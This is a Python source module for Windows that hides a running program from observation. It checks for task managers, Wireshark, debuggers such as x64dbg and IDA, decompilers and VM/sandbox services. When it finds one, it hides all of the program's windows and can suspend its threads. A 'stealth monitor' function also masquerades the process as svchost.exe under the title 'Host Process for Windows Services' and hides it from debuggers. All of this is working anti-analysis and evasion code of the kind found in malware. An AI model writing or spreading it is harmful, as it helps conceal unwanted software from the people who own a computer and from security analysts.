"""Process monitor to detect task manager and hide the application."""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import threading
import time
from typing import Callable, Set

logger = logging.getLogger(__name__)

# Task managers and process viewers
TASK_MANAGERS: Set[str] = {
    "taskmgr.exe",
    "procexp.exe",
    "procexp64.exe", 
    "processhacker.exe",
    "perfmon.exe",
    "resmon.exe",
    "procmon.exe",
    "procmon64.exe",
    "taskman.exe",
}

# System information tools
SYSTEM_INFO_TOOLS: Set[str] = {
    "systeminfo.exe",
    "msinfo32.exe",
    "dxdiag.exe",
}

# Network monitoring tools
NETWORK_MONITORS: Set[str] = {
    "wireshark.exe",
    "fiddler.exe",
    "tcpview.exe",
    "tcpview64.exe",
    "netstat.exe",
    "currports.exe",
    "cports.exe",
    "glasswire.exe",
}

# Security/Analysis tools
SECURITY_TOOLS: Set[str] = {
    "autoruns.exe",
    "autoruns64.exe",
    "pestudio.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "ida.exe",
    "ida64.exe",
    "ghidra.exe",
    "dnspy.exe",
    "de4dot.exe",
    "dotpeek.exe",
    "ilspy.exe",
    "httpdebuggerpro.exe",
    "fiddler.exe",
    "charles.exe",
}

# Command line tools that may be used for reconnaissance
CMD_RECON_TOOLS: Set[str] = {
    "wmic.exe",
    "tasklist.exe",
    "qprocess.exe",
    "query.exe",
}

# Virtual machine / sandbox detection tools
VM_DETECTION_TOOLS: Set[str] = {
    "vboxservice.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "vmwareuser.exe",
    "sandboxie.exe",
    "sbiectrl.exe",
}

# Default: monitor task managers only
MONITORED_PROCESSES = TASK_MANAGERS.copy()

# All processes combined for paranoid mode
ALL_MONITORED_PROCESSES: Set[str] = (
    TASK_MANAGERS | 
    SYSTEM_INFO_TOOLS | 
    NETWORK_MONITORS | 
    SECURITY_TOOLS | 
    CMD_RECON_TOOLS |
    VM_DETECTION_TOOLS
)


class MonitorLevel:
    """Monitoring aggressiveness levels."""
    MINIMAL = "minimal"      # Only task managers
    STANDARD = "standard"    # Task managers + system info
    EXTENDED = "extended"    # + network monitors
    PARANOID = "paranoid"    # Everything


def get_processes_for_level(level: str) -> Set[str]:
    """Get the set of processes to monitor based on level."""
    if level == MonitorLevel.MINIMAL:
        return TASK_MANAGERS.copy()
    elif level == MonitorLevel.STANDARD:
        return TASK_MANAGERS | SYSTEM_INFO_TOOLS
    elif level == MonitorLevel.EXTENDED:
        return TASK_MANAGERS | SYSTEM_INFO_TOOLS | NETWORK_MONITORS
    elif level == MonitorLevel.PARANOID:
        return ALL_MONITORED_PROCESSES.copy()
    return TASK_MANAGERS.copy()


class ProcessMonitor:
    """Monitors for task manager and similar processes, triggers hide callback."""

    def __init__(
        self,
        on_detected: Callable[[], None] | None = None,
        on_cleared: Callable[[], None] | None = None,
        check_interval: float = 0.5,
        level: str = MonitorLevel.MINIMAL,
        custom_processes: Set[str] | None = None,
    ) -> None:
        self._on_detected = on_detected
        self._on_cleared = on_cleared
        self._check_interval = check_interval
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None
        self._detected = False
        self._detected_process: str | None = None
        
        # Set processes to monitor based on level or custom list
        if custom_processes:
            self._monitored = {p.lower() for p in custom_processes}
        else:
            self._monitored = get_processes_for_level(level)
    
    @property
    def detected_process(self) -> str | None:
        """Return the name of the detected process, if any."""
        return self._detected_process
    
    def add_process(self, process_name: str) -> None:
        """Add a process to monitor."""
        self._monitored.add(process_name.lower())
    
    def remove_process(self, process_name: str) -> None:
        """Remove a process from monitoring."""
        self._monitored.discard(process_name.lower())
    
    def set_level(self, level: str) -> None:
        """Change monitoring level."""
        self._monitored = get_processes_for_level(level)

    def start(self) -> None:
        if platform.system() != "Windows":
            logger.debug("Process monitor only supported on Windows.")
            return
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()
        logger.debug("Process monitor started.")

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._thread = None
        logger.debug("Process monitor stopped.")

    def _check_processes(self) -> tuple[bool, str | None]:
        """Check if any monitored process is running.
        
        Returns:
            Tuple of (detected: bool, process_name: str | None)
        """
        try:
            import ctypes.wintypes as wintypes

            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
            MAX_PATH = 260

            kernel32 = ctypes.windll.kernel32
            psapi = ctypes.windll.psapi

            process_ids = (ctypes.c_ulong * 2048)()
            bytes_returned = ctypes.c_ulong()

            if not psapi.EnumProcesses(
                ctypes.byref(process_ids),
                ctypes.sizeof(process_ids),
                ctypes.byref(bytes_returned),
            ):
                return False, None

            num_processes = bytes_returned.value // ctypes.sizeof(ctypes.c_ulong)

            for i in range(num_processes):
                pid = process_ids[i]
                if pid == 0:
                    continue

                handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
                if not handle:
                    continue

                try:
                    exe_path = (ctypes.c_wchar * MAX_PATH)()
                    size = wintypes.DWORD(MAX_PATH)
                    if kernel32.QueryFullProcessImageNameW(handle, 0, exe_path, ctypes.byref(size)):
                        exe_name = os.path.basename(exe_path.value).lower()
                        if exe_name in self._monitored:
                            return True, exe_name
                finally:
                    kernel32.CloseHandle(handle)

            return False, None
        except Exception as e:
            logger.debug("Process check failed: %s", e)
            return False, None

    def _monitor_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                detected, process_name = self._check_processes()
                if detected and not self._detected:
                    self._detected = True
                    self._detected_process = process_name
                    logger.debug("Monitoring tool detected: %s, triggering hide.", process_name)
                    if self._on_detected:
                        try:
                            self._on_detected()
                        except Exception:
                            logger.exception("on_detected callback failed")
                elif not detected and self._detected:
                    self._detected = False
                    logger.debug("Monitoring tool closed (%s), triggering show.", self._detected_process)
                    self._detected_process = None
                    if self._on_cleared:
                        try:
                            self._on_cleared()
                        except Exception:
                            logger.exception("on_cleared callback failed")
            except Exception:
                logger.exception("Monitor loop error")

            self._stop_event.wait(self._check_interval)


_console_hidden = False


def hide_console_window() -> None:
    """Hide the console window."""
    global _console_hidden
    if platform.system() != "Windows":
        return
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE
            _console_hidden = True
            logger.debug("Console window hidden.")
    except Exception as e:
        logger.debug("Failed to hide console: %s", e)


def show_console_window() -> None:
    """Show the console window."""
    global _console_hidden
    if platform.system() != "Windows":
        return
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 5)  # SW_SHOW
            _console_hidden = False
            logger.debug("Console window shown.")
    except Exception as e:
        logger.debug("Failed to show console: %s", e)


def suspend_current_process() -> None:
    """Suspend all threads of the current process except the monitor thread."""
    if platform.system() != "Windows":
        return
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        current_pid = kernel32.GetCurrentProcessId()
        current_tid = kernel32.GetCurrentThreadId()

        THREAD_SUSPEND_RESUME = 0x0002
        
        class THREADENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", ctypes.c_ulong),
                ("cntUsage", ctypes.c_ulong),
                ("th32ThreadID", ctypes.c_ulong),
                ("th32OwnerProcessID", ctypes.c_ulong),
                ("tpBasePri", ctypes.c_long),
                ("tpDeltaPri", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong),
            ]

        TH32CS_SNAPTHREAD = 0x00000004
        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        if snapshot == -1:
            return

        try:
            te = THREADENTRY32()
            te.dwSize = ctypes.sizeof(THREADENTRY32)

            if kernel32.Thread32First(snapshot, ctypes.byref(te)):
                while True:
                    if te.th32OwnerProcessID == current_pid and te.th32ThreadID != current_tid:
                        thread_handle = kernel32.OpenThread(THREAD_SUSPEND_RESUME, False, te.th32ThreadID)
                        if thread_handle:
                            kernel32.SuspendThread(thread_handle)
                            kernel32.CloseHandle(thread_handle)
                    if not kernel32.Thread32Next(snapshot, ctypes.byref(te)):
                        break
        finally:
            kernel32.CloseHandle(snapshot)

        logger.debug("Process threads suspended.")
    except Exception as e:
        logger.debug("Failed to suspend process: %s", e)


def resume_current_process() -> None:
    """Resume all threads of the current process."""
    if platform.system() != "Windows":
        return
    try:
        kernel32 = ctypes.windll.kernel32

        current_pid = kernel32.GetCurrentProcessId()
        current_tid = kernel32.GetCurrentThreadId()

        THREAD_SUSPEND_RESUME = 0x0002

        class THREADENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", ctypes.c_ulong),
                ("cntUsage", ctypes.c_ulong),
                ("th32ThreadID", ctypes.c_ulong),
                ("th32OwnerProcessID", ctypes.c_ulong),
                ("tpBasePri", ctypes.c_long),
                ("tpDeltaPri", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong),
            ]

        TH32CS_SNAPTHREAD = 0x00000004
        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        if snapshot == -1:
            return

        try:
            te = THREADENTRY32()
            te.dwSize = ctypes.sizeof(THREADENTRY32)

            if kernel32.Thread32First(snapshot, ctypes.byref(te)):
                while True:
                    if te.th32OwnerProcessID == current_pid and te.th32ThreadID != current_tid:
                        thread_handle = kernel32.OpenThread(THREAD_SUSPEND_RESUME, False, te.th32ThreadID)
                        if thread_handle:
                            kernel32.ResumeThread(thread_handle)
                            kernel32.CloseHandle(thread_handle)
                    if not kernel32.Thread32Next(snapshot, ctypes.byref(te)):
                        break
        finally:
            kernel32.CloseHandle(snapshot)

        logger.debug("Process threads resumed.")
    except Exception as e:
        logger.debug("Failed to resume process: %s", e)


_global_monitor: ProcessMonitor | None = None


def start_taskmanager_monitor(
    hide_only: bool = True,
    level: str = MonitorLevel.MINIMAL,
    check_interval: float = 0.3,
) -> ProcessMonitor:
    """
    Start the global task manager monitor.
    
    Args:
        hide_only: If True, only hide console window. If False, also suspend process.
        level: Monitoring level (minimal, standard, extended, paranoid).
        check_interval: How often to check for processes (seconds).
    
    Levels:
        - minimal: Only task managers (taskmgr, procexp, etc.)
        - standard: + system info tools (systeminfo, msinfo32)
        - extended: + network monitors (wireshark, tcpview, etc.)
        - paranoid: + security tools, debuggers, VM detection
    """
    global _global_monitor

    if _global_monitor:
        return _global_monitor

    def on_detected() -> None:
        hide_console_window()
        hide_all_windows()
        if not hide_only:
            suspend_current_process()

    def on_cleared() -> None:
        if not hide_only:
            resume_current_process()
        show_console_window()
        show_all_windows()

    _global_monitor = ProcessMonitor(
        on_detected=on_detected,
        on_cleared=on_cleared,
        check_interval=check_interval,
        level=level,
    )
    _global_monitor.start()
    logger.info("Process monitor started with level: %s", level)
    return _global_monitor


def stop_taskmanager_monitor() -> None:
    """Stop the global task manager monitor."""
    global _global_monitor
    if _global_monitor:
        _global_monitor.stop()
        _global_monitor = None
        logger.info("Process monitor stopped.")


def set_monitor_level(level: str) -> None:
    """Change the monitoring level of the global monitor."""
    global _global_monitor
    if _global_monitor:
        _global_monitor.set_level(level)
        logger.info("Process monitor level changed to: %s", level)


def get_monitor_status() -> dict:
    """Get current monitor status."""
    global _global_monitor
    if not _global_monitor:
        return {"active": False}
    return {
        "active": True,
        "detected": _global_monitor._detected,
        "detected_process": _global_monitor.detected_process,
        "monitored_count": len(_global_monitor._monitored),
    }


# Window handle tracking for hiding all windows
_app_windows: list[int] = []


def hide_all_windows() -> None:
    """Hide all windows belonging to the current process."""
    global _app_windows
    if platform.system() != "Windows":
        return
    try:
        import ctypes.wintypes as wintypes
        
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        current_pid = kernel32.GetCurrentProcessId()
        _app_windows = []
        
        # Callback for EnumWindows
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
        
        def enum_callback(hwnd: int, lparam: int) -> bool:
            # Get the process ID for this window
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            
            if pid.value == current_pid:
                # Check if window is visible
                if user32.IsWindowVisible(hwnd):
                    _app_windows.append(hwnd)
                    user32.ShowWindow(hwnd, 0)  # SW_HIDE
            return True
        
        user32.EnumWindows(WNDENUMPROC(enum_callback), 0)
        logger.debug("Hidden %d application windows.", len(_app_windows))
    except Exception as e:
        logger.debug("Failed to hide windows: %s", e)


def show_all_windows() -> None:
    """Show all previously hidden windows."""
    global _app_windows
    if platform.system() != "Windows":
        return
    try:
        user32 = ctypes.windll.user32
        
        for hwnd in _app_windows:
            user32.ShowWindow(hwnd, 5)  # SW_SHOW
        
        logger.debug("Restored %d application windows.", len(_app_windows))
        _app_windows = []
    except Exception as e:
        logger.debug("Failed to show windows: %s", e)


# ============================================================================
# Enhanced monitoring with process masking
# ============================================================================

_masking_enabled = False


def start_stealth_monitor(
    hide_only: bool = True,
    level: str = MonitorLevel.EXTENDED,
    mask_process: bool = True,
    mask_as: str = "svchost.exe",
    check_interval: float = 0.2,
) -> ProcessMonitor:
    """
    Start an enhanced stealth monitor with process masking.
    
    This combines:
    - Process monitoring (detects task managers, etc.)
    - Window hiding (hides all app windows when detected)
    - Process masking (disguises process name in Task Manager)
    
    Args:
        hide_only: If True, only hide. If False, also suspend process.
        level: Monitoring level (minimal, standard, extended, paranoid)
        mask_process: Whether to mask the process name
        mask_as: System process to masquerade as
        check_interval: How often to check (seconds)
    
    Returns:
        The ProcessMonitor instance
    """
    global _global_monitor, _masking_enabled
    
    if _global_monitor:
        return _global_monitor
    
    # Apply process masking at startup if enabled
    if mask_process and platform.system() == "Windows":
        try:
            from .process_masking import apply_full_masking
            result = apply_full_masking(
                process_name=mask_as,
                window_title="Host Process for Windows Services",
                hide_debugger=True,
            )
            _masking_enabled = result.get("process_masked", False)
            logger.info("Process masking applied: %s", result)
        except ImportError:
            logger.warning("process_masking module not available")
        except Exception as e:
            logger.warning("Failed to apply process masking: %s", e)
    
    def on_detected() -> None:
        hide_console_window()
        hide_all_windows()
        if not hide_only:
            suspend_current_process()
    
    def on_cleared() -> None:
        if not hide_only:
            resume_current_process()
        show_console_window()
        show_all_windows()
    
    _global_monitor = ProcessMonitor(
        on_detected=on_detected,
        on_cleared=on_cleared,
        check_interval=check_interval,
        level=level,
    )
    _global_monitor.start()
    logger.info("Stealth monitor started (level=%s, masked=%s)", level, _masking_enabled)
    return _global_monitor


def stop_stealth_monitor() -> None:
    """Stop the stealth monitor and remove masking."""
    global _masking_enabled
    
    stop_taskmanager_monitor()
    
    if _masking_enabled and platform.system() == "Windows":
        try:
            from .process_masking import unmask_process
            unmask_process()
            _masking_enabled = False
            logger.info("Process masking removed")
        except Exception as e:
            logger.warning("Failed to remove masking: %s", e)


def get_stealth_status() -> dict:
    """Get full stealth status including masking."""
    status = get_monitor_status()
    status["masking_enabled"] = _masking_enabled
    
    if _masking_enabled:
        try:
            from .process_masking import get_masking_status
            status["masking_details"] = get_masking_status()
        except ImportError:
            pass
    
    return status
